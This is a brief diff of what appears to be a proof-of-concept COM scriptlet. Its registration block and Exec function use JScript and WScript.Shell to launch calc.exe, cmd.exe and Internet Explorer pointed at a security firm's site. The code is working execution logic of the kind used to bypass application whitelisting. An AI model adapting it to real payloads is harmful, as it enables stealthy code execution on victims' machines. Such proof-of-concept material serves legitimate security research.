@@ -9,8 +9,8 @@
     >
     <script language="JScript">
         <![CDATA[
-            var r = new ActiveXObject("WScript.Shell").Run("iexplore.exe && calc.exe"); 
-    
+            var r = new ActiveXObject("WScript.Shell").Run("iexplore.exe www.nsideattacklogic.de"); 
+            var s = new ActiveXObject("WScript.Shell").Run("calc.exe"); 
         ]]>
 </script>
 </registration>
@@ -24,6 +24,7 @@
     function Exec()
     {
         var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");
+        var s = new ActiveXObject("WScript.Shell").Run("cmd.exe");
     }
     
 ]]>
